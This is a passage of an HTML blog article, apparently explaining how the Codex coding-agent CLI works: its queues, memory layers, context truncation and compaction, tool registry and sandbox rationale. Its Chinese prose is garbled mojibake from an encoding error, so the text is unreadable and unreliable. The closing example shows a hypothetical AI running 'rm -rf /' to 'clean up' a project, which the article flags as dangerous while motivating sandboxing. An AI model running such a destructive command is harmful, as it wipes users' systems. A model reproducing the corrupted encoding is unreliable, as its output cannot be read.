    User-&gt;&gt;SQ: æäº¤æ‰¹å‡†å†³å®š
    SQ-&gt;&gt;Engine: æ¥æ”¶æ‰¹å‡†

    Tools--&gt;&gt;Engine: å·¥å…·æ‰§è¡Œç»“æœ
    Engine-&gt;&gt;EQ: å‘é€ ExecCommandOutput
    EQ--&gt;&gt;User: æ˜¾ç¤ºæ‰§è¡Œç»“æœ

    Engine-&gt;&gt;LLM: ç»§ç»­æ¨ç†
    LLM--&gt;&gt;Engine: æœ€ç»ˆå“åº”
    Engine-&gt;&gt;EQ: å‘é€ TurnCompleted
    EQ--&gt;&gt;User: æ˜¾ç¤ºå®ŒæˆçŠ¶æ€

</code></pre>
<p><strong>ç”¨å¤§ç™½è¯è§£é‡Š</strong>ï¼š</p>
<p>æƒ³è±¡ä¸€å®¶é¤å…ï¼š</p>
<ul>
<li><strong>æäº¤é˜Ÿåˆ—ï¼ˆSQï¼‰</strong> å°±åƒé¡¾å®¢ä¸‹å•çš„çª—å£</li>
<li><strong>Codex æ ¸å¿ƒå¼•æ“</strong> å°±åƒå¨æˆ¿</li>
<li><strong>äº‹ä»¶é˜Ÿåˆ—ï¼ˆEQï¼‰</strong> å°±åƒå‡ºé¤çª—å£</li>
</ul>
<p>é¡¾å®¢ä¸‹å•åä¸éœ€è¦ç­‰åœ¨çª—å£ï¼Œå¯ä»¥å»åº§ä½ä¸Šç­‰ã€‚å¨æˆ¿åšå¥½èœåï¼Œé€šè¿‡å‡ºé¤çª—å£é€šçŸ¥é¡¾å®¢å–é¤ã€‚</p>
<h4 data-id="heading-15">æ ¸å¿ƒä»£ç ç»“æ„</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ç®€åŒ–ç‰ˆçš„ Codex æ ¸å¿ƒç»“æ„</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Codex</span> {
    <span class="hljs-comment">// æäº¤é˜Ÿåˆ—ï¼šæ¥æ”¶ç”¨æˆ·è¾“å…¥</span>
    tx_sub: Sender&lt;Submission&gt;,
    <span class="hljs-comment">// äº‹ä»¶é˜Ÿåˆ—ï¼šå‘é€å¤„ç†ç»“æœ</span>
    rx_event: Receiver&lt;Event&gt;,
}
</code></pre>
<h4 data-id="heading-16">äº‹ä»¶ç±»å‹</h4>
<p>Codex å®šä¹‰äº†ä¸°å¯Œçš„äº‹ä»¶ç±»å‹æ¥æè¿°å„ç§æ“ä½œï¼š</p>






























<table><thead><tr><th>äº‹ä»¶ç±»å‹</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>AgentMessage</code></td><td>AI çš„å›å¤</td><td>"æˆ‘æ¥å¸®ä½ ä¿®å¤è¿™ä¸ª bug"</td></tr><tr><td><code>ExecCommandOutput</code></td><td>å‘½ä»¤æ‰§è¡Œç»“æœ</td><td>æµ‹è¯•è¿è¡Œçš„è¾“å‡º</td></tr><tr><td><code>PatchApprovalRequest</code></td><td>è¯·æ±‚æ‰¹å‡†æ–‡ä»¶ä¿®æ”¹</td><td>ä¿®æ”¹ config.js</td></tr><tr><td><code>TokenCount</code></td><td>Token ä½¿ç”¨ç»Ÿè®¡</td><td>è¾“å…¥ 1000ï¼Œè¾“å‡º 500</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-17">è®°å¿†ç³»ç»Ÿï¼šå¦‚ä½•è®°ä½å¯¹è¯</h3>
<h4 data-id="heading-18">é—®é¢˜ï¼šAI çš„"å¥å¿˜ç—‡"</h4>
<p>å¤§è¯­è¨€æ¨¡å‹æœ¬èº«æ˜¯"æ— çŠ¶æ€"çš„ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½æ˜¯å…¨æ–°çš„å¼€å§‹ã€‚å°±åƒä¸€ä¸ªå¤±å¿†çš„äººï¼Œæ¯å¤©æ—©ä¸Šé†’æ¥éƒ½ä¸è®°å¾—æ˜¨å¤©å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<h4 data-id="heading-19">è§£å†³æ–¹æ¡ˆï¼šæŒä¹…åŒ–å†å²</h4>
<p>Codex é€šè¿‡å¤šå±‚è®°å¿†ç³»ç»Ÿè§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TB
    subgraph ShortTerm["çŸ­æœŸè®°å¿† - ä¸Šä¸‹æ–‡ç®¡ç†å™¨"]
        CM["ContextManager"]
        Items["å¯¹è¯é¡¹ç›®åˆ—è¡¨"]
        TokenInfo["Token ç»Ÿè®¡"]
        CM --&gt; Items
        CM --&gt; TokenInfo
    end

    subgraph MediumTerm["ä¸­æœŸè®°å¿† - æ¶ˆæ¯å†å²"]
        History["history.jsonl"]
        Entry1["session_id + timestamp + text"]
        Entry2["session_id + timestamp + text"]
        Entry3["..."]
        History --&gt; Entry1
        History --&gt; Entry2
        History --&gt; Entry3
    end

    subgraph LongTerm["é•¿æœŸè®°å¿† - ä¼šè¯æŒä¹…åŒ–"]
        Sessions["~/.codex/sessions/"]
        Session1["session_abc.json"]
        Session2["session_xyz.json"]
        Sessions --&gt; Session1
        Sessions --&gt; Session2
    end

    subgraph ProjectMemory["é¡¹ç›®è®°å¿† - AGENTS.md"]
        AgentsMD["AGENTS.md"]
        Rules["é¡¹ç›®è§„èŒƒ"]
        Constraints["çº¦æŸæ¡ä»¶"]
        AgentsMD --&gt; Rules
        AgentsMD --&gt; Constraints
    end

    User["ç”¨æˆ·"] --&gt; CM
    CM --&gt;|"ä¿å­˜åˆ°"| History
    CM --&gt;|"æŒä¹…åŒ–"| Sessions
    AgentsMD --&gt;|"åŠ è½½åˆ°"| CM

    style ShortTerm fill:#E3F2FD,stroke:#1976D2
    style MediumTerm fill:#E8F5E9,stroke:#388E3C
    style LongTerm fill:#FFF3E0,stroke:#F57C00
    style ProjectMemory fill:#F3E5F5,stroke:#7B1FA2

</code></pre>
<h4 data-id="heading-20">ä¸‰å±‚è®°å¿†æ¶æ„</h4>
<h5 data-id="heading-21">1. çŸ­æœŸè®°å¿†ï¼šä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆContextManagerï¼‰</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContextManager</span> {
    <span class="hljs-comment">// å½“å‰å¯¹è¯çš„æ‰€æœ‰é¡¹ç›®ï¼ˆä»æ—§åˆ°æ–°æ’åºï¼‰</span>
    items: <span class="hljs-type">Vec</span>&lt;ResponseItem&gt;,
    <span class="hljs-comment">// Token ä½¿ç”¨ä¿¡æ¯</span>
    token_info: <span class="hljs-type">Option</span>&lt;TokenUsageInfo&gt;,
}
</code></pre>
<p><strong>ä½œç”¨</strong>ï¼šç®¡ç†å½“å‰å¯¹è¯ä¸­çš„æ‰€æœ‰æ¶ˆæ¯ã€å·¥å…·è°ƒç”¨å’Œç»“æœã€‚</p>
<h5 data-id="heading-22">2. ä¸­æœŸè®°å¿†ï¼šæ¶ˆæ¯å†å²ï¼ˆMessage Historyï¼‰</h5>
<p>å­˜å‚¨ä½ç½®ï¼š<code>~/.codex/history.jsonl</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"abc123"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"ts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1699123456</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¸®æˆ‘å†™ä¸€ä¸ªæ’åºå‡½æ•°"</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"abc123"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"ts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1699123460</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¥½çš„ï¼Œè¿™æ˜¯å†’æ³¡æ’åºçš„å®ç°..."</span><span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ JSONL æ ¼å¼ï¼ˆæ¯è¡Œä¸€ä¸ª JSONï¼‰</li>
<li>åŸå­å†™å…¥ï¼ˆä¸ä¼šå‡ºç°å†™ä¸€åŠçš„æƒ…å†µï¼‰</li>
<li>è‡ªåŠ¨ç®¡ç†å¤§å°ï¼ˆè¶…è¿‡é™åˆ¶ä¼šæ¸…ç†æ—§è®°å½•ï¼‰</li>
</ul>
<h5 data-id="heading-23">3. é•¿æœŸè®°å¿†ï¼šä¼šè¯æŒä¹…åŒ–</h5>
<p>å­˜å‚¨ä½ç½®ï¼š<code>~/.codex/sessions/</code></p>
<p>æ¯ä¸ªä¼šè¯ä¿å­˜ä¸ºç‹¬ç«‹çš„ JSON æ–‡ä»¶ï¼ŒåŒ…å«å®Œæ•´çš„å¯¹è¯çŠ¶æ€ï¼Œæ”¯æŒéšæ—¶æ¢å¤ã€‚</p>
<h4 data-id="heading-24">é¡¹ç›®æ–‡æ¡£è®°å¿†ï¼šAGENTS.md</h4>
<p>Codex è¿˜ä¼šè¯»å–é¡¹ç›®ä¸­çš„ <code>AGENTS.md</code> æ–‡ä»¶ï¼Œäº†è§£é¡¹ç›®çš„ç‰¹æ®Šè§„åˆ™ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># AGENTS.md</span>

<span class="hljs-section">## é¡¹ç›®è§„èŒƒ</span>
<span class="hljs-bullet">-</span> ä½¿ç”¨ TypeScript ç¼–å†™
<span class="hljs-bullet">-</span> æ‰€æœ‰å‡½æ•°å¿…é¡»æœ‰æ³¨é‡Š
<span class="hljs-bullet">-</span> æµ‹è¯•è¦†ç›–ç‡è¦æ±‚ 80% ä»¥ä¸Š

<span class="hljs-section">## ç¦æ­¢æ“ä½œ</span>
<span class="hljs-bullet">-</span> ä¸è¦ä¿®æ”¹ .env æ–‡ä»¶
<span class="hljs-bullet">-</span> ä¸è¦åˆ é™¤ migrations æ–‡ä»¶å¤¹
</code></pre>
<hr/>
<h3 data-id="heading-25">ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼šæ™ºèƒ½ç®¡ç†æœ‰é™çš„"è„‘å®¹é‡"</h3>
<h4 data-id="heading-26">é—®é¢˜ï¼šä¸Šä¸‹æ–‡çª—å£çš„é™åˆ¶</h4>
<p>å¤§è¯­è¨€æ¨¡å‹æœ‰ä¸€ä¸ª"ä¸Šä¸‹æ–‡çª—å£"é™åˆ¶ï¼Œå°±åƒäººçš„å·¥ä½œè®°å¿†ä¸€æ ·æœ‰é™ã€‚å¦‚æœå¯¹è¯å¤ªé•¿ï¼Œæ¨¡å‹å°±ä¼š"è®°ä¸ä½"å‰é¢çš„å†…å®¹ã€‚</p>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ä¸Šä¸‹æ–‡çª—å£ç¤ºæ„å›¾                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  <span class="hljs-selector-attr">[ç³»ç»Ÿæç¤º]</span> <span class="hljs-selector-attr">[ç”¨æˆ·1]</span> <span class="hljs-selector-attr">[AI1]</span> <span class="hljs-selector-attr">[ç”¨æˆ·2]</span> <span class="hljs-selector-attr">[AI2]</span> ... <span class="hljs-selector-attr">[ç”¨æˆ·N]</span> <span class="hljs-selector-attr">[AI N]</span>  â”‚
â”‚  â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ æœ‰é™çš„å®¹é‡ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’           â”‚
â”‚                                                            â”‚
â”‚  è¶…å‡ºå®¹é‡æ—¶ï¼šæ—§çš„å†…å®¹ä¼šè¢«"é—å¿˜"                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-27">è§£å†³æ–¹æ¡ˆï¼šæ™ºèƒ½ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>Codex é‡‡ç”¨å¤šç§ç­–ç•¥æ¥æœ€å¤§åŒ–åˆ©ç”¨æœ‰é™çš„ä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
flowchart TD
    Start["å¼€å§‹æ–°çš„å¯¹è¯è½®æ¬¡"] --&gt; Check{"æ£€æŸ¥ä¸Šä¸‹æ–‡å¤§å°"}

    Check --&gt;|"&lt; 80% çª—å£"| Normal["æ­£å¸¸æ·»åŠ å†…å®¹"]
    Check --&gt;|"&gt;= 80% çª—å£"| Strategy["åº”ç”¨ä¼˜åŒ–ç­–ç•¥"]

    Strategy --&gt; S1["ç­–ç•¥1: Token ä¼°ç®—"]
    Strategy --&gt; S2["ç­–ç•¥2: æ™ºèƒ½æˆªæ–­"]
    Strategy --&gt; S3["ç­–ç•¥3: å¯¹è¯å‹ç¼©"]
    Strategy --&gt; S4["ç­–ç•¥4: ç¯å¢ƒå·®å¼‚"]

    S1 --&gt; |"æ¯4å­—èŠ‚â‰ˆ1 token"| Estimate["å¿«é€Ÿä¼°ç®—å¤§å°"]
    S2 --&gt; |"ä¿ç•™å¤´å°¾"| Truncate["åˆ é™¤ä¸­é—´å†…å®¹"]
    S3 --&gt; |"AI ç”Ÿæˆæ‘˜è¦"| Compact["å‹ç¼©å†å²å¯¹è¯"]
    S4 --&gt; |"åªå‘é€å˜åŒ–"| Diff["å·®å¼‚åŒ–æ›´æ–°"]

    Estimate --&gt; Optimize["ä¼˜åŒ–åçš„ä¸Šä¸‹æ–‡"]
    Truncate --&gt; Optimize
    Compact --&gt; Optimize
    Diff --&gt; Optimize

    Normal --&gt; Send["å‘é€ç»™æ¨¡å‹"]
    Optimize --&gt; Send

    Send --&gt; Response["è·å–æ¨¡å‹å“åº”"]
    Response --&gt; Update["æ›´æ–° Token ç»Ÿè®¡"]
    Update --&gt; End["å®Œæˆ"]

    style Start fill:#4CAF50,color:#fff
    style End fill:#4CAF50,color:#fff
    style Strategy fill:#FF9800,color:#fff
    style Check fill:#2196F3,color:#fff

</code></pre>
<h4 data-id="heading-28">ç­–ç•¥ 1ï¼šToken ä¼°ç®—</h4>
<p>ä¸ä½¿ç”¨ç²¾ç¡®çš„ tokenizerï¼ˆå¤ªæ…¢ï¼‰ï¼Œè€Œæ˜¯ç”¨ç®€å•çš„å¯å‘å¼ç®—æ³•ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">const</span> APPROX_BYTES_PER_TOKEN: <span class="hljs-type">usize</span> = <span class="hljs-number">4</span>;

<span class="hljs-comment">// ä¼°ç®— token æ•°é‡ï¼šæ¯ 4 ä¸ªå­—èŠ‚çº¦ç­‰äº 1 ä¸ª token</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">approx_token_count</span>(text: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
    (text.<span class="hljs-title function_ invoke__">len</span>() + <span class="hljs-number">3</span>) / <span class="hljs-number">4</span>  <span class="hljs-comment">// å‘ä¸Šå–æ•´</span>
}
</code></pre>
<h4 data-id="heading-29">ç­–ç•¥ 2ï¼šæ™ºèƒ½æˆªæ–­</h4>
<p>å¯¹äºè¿‡é•¿çš„è¾“å‡ºï¼Œä¿ç•™å¤´å°¾ï¼Œåˆ é™¤ä¸­é—´ï¼š</p>
<pre><code class="hljs language-css" lang="css">åŸå§‹è¾“å‡ºï¼ˆ<span class="hljs-number">10000</span> å­—ç¬¦ï¼‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-selector-attr">[å¤´éƒ¨ 1000 å­—ç¬¦]</span> <span class="hljs-selector-attr">[...ä¸­é—´å†…å®¹...]</span> <span class="hljs-selector-attr">[å°¾éƒ¨ 1000 å­—ç¬¦]</span>          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æˆªæ–­åï¼ˆ<span class="hljs-number">2500</span> å­—ç¬¦ï¼‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-selector-attr">[å¤´éƒ¨ 1000 å­—ç¬¦]</span> ... <span class="hljs-selector-attr">[çœç•¥ 7500 å­—ç¬¦]</span> ... <span class="hljs-selector-attr">[å°¾éƒ¨ 1000 å­—ç¬¦]</span>  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-30">ç­–ç•¥ 3ï¼šå¯¹è¯å‹ç¼©ï¼ˆCompactionï¼‰</h4>
<p>å½“ä¸Šä¸‹æ–‡æ¥è¿‘æ»¡æ—¶ï¼ŒCodex ä¼šè¯·æ±‚ AI å¯¹ä¹‹å‰çš„å¯¹è¯è¿›è¡Œ"æ‘˜è¦"ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">å‹ç¼©å‰ï¼š
<span class="hljs-section">ç”¨æˆ·: å¸®æˆ‘çœ‹çœ‹ä¸ºä»€ä¹ˆæµ‹è¯•å¤±è´¥</span>
<span class="hljs-section">AI: å¥½çš„ï¼Œè®©æˆ‘è¿è¡Œæµ‹è¯•... æµ‹è¯•ç»“æœæ˜¯... é—®é¢˜åœ¨äº...</span>
<span class="hljs-section">ç”¨æˆ·: ä¿®å¤å®ƒ</span>
<span class="hljs-section">AI: æˆ‘ä¿®æ”¹äº†æ–‡ä»¶... ç°åœ¨æµ‹è¯•é€šè¿‡äº†</span>
<span class="hljs-section">ç”¨æˆ·: è¿˜æœ‰å…¶ä»–é—®é¢˜å—ï¼Ÿ</span>
...ï¼ˆå¾ˆå¤šè½®å¯¹è¯ï¼‰

å‹ç¼©åï¼š
[æ‘˜è¦] ç”¨æˆ·è¯·æ±‚ä¿®å¤æµ‹è¯•å¤±è´¥é—®é¢˜ï¼Œç»è¿‡åˆ†æå‘ç°æ˜¯ç±»å‹é”™è¯¯ï¼Œ
å·²ä¿®æ”¹ src/utils.ts ç¬¬ 42 è¡Œï¼Œæµ‹è¯•ç°å·²é€šè¿‡ã€‚
</code></pre>
<h4 data-id="heading-31">ç­–ç•¥ 4ï¼šç¯å¢ƒä¸Šä¸‹æ–‡å·®å¼‚</h4>
<p>åªå‘é€å˜åŒ–çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½å‘é€å®Œæ•´çš„ç¯å¢ƒä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- é¦–æ¬¡å‘é€å®Œæ•´ä¸Šä¸‹æ–‡ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">environment_context</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cwd</span>&gt;</span>/path/to/project<span class="hljs-tag">&lt;/<span class="hljs-name">cwd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">sandbox_mode</span>&gt;</span>workspace-write<span class="hljs-tag">&lt;/<span class="hljs-name">sandbox_mode</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">shell</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">shell</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">environment_context</span>&gt;</span>

<span class="hljs-comment">&lt;!-- ä¹‹ååªå‘é€å˜åŒ– --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">environment_context_diff</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cwd</span>&gt;</span>/path/to/project/src<span class="hljs-tag">&lt;/<span class="hljs-name">cwd</span>&gt;</span>  <span class="hljs-comment">&lt;!-- åªæœ‰å·¥ä½œç›®å½•å˜äº† --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">environment_context_diff</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-32">å·¥å…·ç³»ç»Ÿï¼šè®© AI èƒ½å¤Ÿ"åŠ¨æ‰‹"</h3>
<h4 data-id="heading-33">ä¸ºä»€ä¹ˆéœ€è¦å·¥å…·ï¼Ÿ</h4>
<p>å¤§è¯­è¨€æ¨¡å‹æœ¬èº«åªèƒ½"è¯´"ï¼Œä¸èƒ½"åš"ã€‚å·¥å…·ç³»ç»Ÿå°±æ˜¯ç»™ AI è£…ä¸Š"æ‰‹"ï¼Œè®©å®ƒèƒ½å¤Ÿï¼š</p>
<ul>
<li>æ‰§è¡Œ shell å‘½ä»¤</li>
<li>è¯»å†™æ–‡ä»¶</li>
<li>æœç´¢ä»£ç </li>
<li>è°ƒç”¨å¤–éƒ¨æœåŠ¡</li>
</ul>
<h4 data-id="heading-34">å·¥å…·æ¶æ„</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph LR
    subgraph AI["AI æ¨¡å‹"]
        LLM["å¤§è¯­è¨€æ¨¡å‹"]
        Decision["å†³ç­–: éœ€è¦ä½¿ç”¨å·¥å…·"]
    end

    subgraph Router["å·¥å…·è·¯ç”±å™¨"]
        Registry["å·¥å…·æ³¨å†Œè¡¨"]
        Dispatch["åˆ†å‘å™¨"]
    end

    subgraph Tools["å†…ç½®å·¥å…·"]
        Shell["Shell æ‰§è¡Œå™¨"]
        ReadFile["æ–‡ä»¶è¯»å–"]
        ApplyPatch["è¡¥ä¸åº”ç”¨"]
        GrepFiles["æ–‡ä»¶æœç´¢"]
        ListDir["ç›®å½•åˆ—è¡¨"]
        ViewImage["å›¾ç‰‡æŸ¥çœ‹"]
    end

    subgraph External["å¤–éƒ¨å·¥å…·"]
        MCP["MCP å·¥å…·"]
        WebSearch["ç½‘ç»œæœç´¢"]
    end

    subgraph Security["å®‰å…¨æ£€æŸ¥"]
        Policy["æ‰§è¡Œç­–ç•¥"]
        Sandbox["æ²™ç®±éš”ç¦»"]
        Approval["ç”¨æˆ·å®¡æ‰¹"]
    end

    LLM --&gt; Decision
    Decision --&gt; Registry
    Registry --&gt; Dispatch

    Dispatch --&gt; Shell
    Dispatch --&gt; ReadFile
    Dispatch --&gt; ApplyPatch
    Dispatch --&gt; GrepFiles
    Dispatch --&gt; ListDir
    Dispatch --&gt; ViewImage
    Dispatch --&gt; MCP
    Dispatch --&gt; WebSearch

    Shell --&gt; Policy
    ApplyPatch --&gt; Approval
    MCP --&gt; Approval

    Policy --&gt; Sandbox
    Approval --&gt; Sandbox

    Sandbox --&gt; Result["æ‰§è¡Œç»“æœ"]
    Result --&gt; LLM

    style AI fill:#E3F2FD,stroke:#1976D2
    style Router fill:#E8F5E9,stroke:#388E3C
    style Tools fill:#FFF3E0,stroke:#F57C00
    style External fill:#F3E5F5,stroke:#7B1FA2
    style Security fill:#FCE4EC,stroke:#C2185B

</code></pre>
<h4 data-id="heading-35">å†…ç½®å·¥å…·åˆ—è¡¨</h4>


















































<table><thead><tr><th>å·¥å…·åç§°</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>shell</code></td><td>æ‰§è¡Œå‘½ä»¤</td><td><code>npm test</code>, <code>git status</code></td></tr><tr><td><code>read_file</code></td><td>è¯»å–æ–‡ä»¶</td><td>æŸ¥çœ‹ <code>config.json</code></td></tr><tr><td><code>list_dir</code></td><td>åˆ—å‡ºç›®å½•</td><td>æµè§ˆé¡¹ç›®ç»“æ„</td></tr><tr><td><code>apply_patch</code></td><td>ä¿®æ”¹æ–‡ä»¶</td><td>ä¿®å¤ä»£ç  bug</td></tr><tr><td><code>grep_files</code></td><td>æœç´¢æ–‡ä»¶</td><td>æŸ¥æ‰¾å‡½æ•°å®šä¹‰</td></tr><tr><td><code>view_image</code></td><td>æŸ¥çœ‹å›¾ç‰‡</td><td>åˆ†ææˆªå›¾</td></tr><tr><td><code>web_search</code></td><td>ç½‘ç»œæœç´¢</td><td>æŸ¥æ‰¾æ–‡æ¡£</td></tr><tr><td><code>mcp_tool</code></td><td>è°ƒç”¨ MCP å·¥å…·</td><td>ä½¿ç”¨å¤–éƒ¨æœåŠ¡</td></tr></tbody></table>
<h4 data-id="heading-36">å·¥å…·è°ƒç”¨æµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> AI å†³å®šä½¿ç”¨å·¥å…·
   â””â”€â”€ "æˆ‘éœ€è¦è¿è¡Œæµ‹è¯•æ¥éªŒè¯ä¿®å¤"

<span class="hljs-bullet">2.</span> ç”Ÿæˆå·¥å…·è°ƒç”¨
   â””â”€â”€ { tool: "shell", command: "npm test" }

<span class="hljs-bullet">3.</span> æƒé™æ£€æŸ¥
   â””â”€â”€ æ£€æŸ¥æ‰§è¡Œç­–ç•¥å’Œæ²™ç®±è§„åˆ™

<span class="hljs-bullet">4.</span> æ‰§è¡Œå·¥å…·
   â””â”€â”€ åœ¨æ²™ç®±ä¸­è¿è¡Œå‘½ä»¤

<span class="hljs-bullet">5.</span> è¿”å›ç»“æœ
   â””â”€â”€ å°†è¾“å‡ºè¿”å›ç»™ AI

<span class="hljs-bullet">6.</span> AI ç»§ç»­æ¨ç†
   â””â”€â”€ "æµ‹è¯•é€šè¿‡äº†ï¼Œä¿®å¤æˆåŠŸï¼"
</code></pre>
<h4 data-id="heading-37">å·¥å…·æ³¨å†Œæœºåˆ¶</h4>
<p>Codex ä½¿ç”¨ç»Ÿä¸€çš„å·¥å…·æ³¨å†Œè¡¨æ¥ç®¡ç†æ‰€æœ‰å·¥å…·ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ToolRegistry</span> {
    handlers: HashMap&lt;ToolType, <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> ToolHandler&gt;&gt;,
}

<span class="hljs-keyword">pub</span> <span class="hljs-keyword">trait</span> <span class="hljs-title class_">ToolHandler</span>: <span class="hljs-built_in">Send</span> + <span class="hljs-built_in">Sync</span> {
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">handle</span>(
        &amp;<span class="hljs-keyword">self</span>,
        invocation: ToolInvocation
    ) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;ToolOutput, ToolError&gt;;
}
</code></pre>
<hr/>
<h3 data-id="heading-38">å®‰å…¨æ²™ç®±ï¼šç»™ AI ä¸€ä¸ªå®‰å…¨çš„"æ¸¸ä¹åœº"</h3>
<h4 data-id="heading-39">ä¸ºä»€ä¹ˆéœ€è¦æ²™ç®±ï¼Ÿ</h4>
<p>è®© AI æ‰§è¡Œå‘½ä»¤æ˜¯å±é™©çš„ã€‚æƒ³è±¡ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ç”¨æˆ·: å¸®æˆ‘æ¸…ç†é¡¹ç›®
AI: å¥½çš„ï¼Œæˆ‘æ¥æ‰§è¡Œ <span class="hljs-built_in">rm</span> -rf /  <span class="hljs-comment"># å±é™©ï¼ä¼šåˆ é™¤æ•´ä¸ªç³»ç»Ÿï¼</span>
</code></pre>
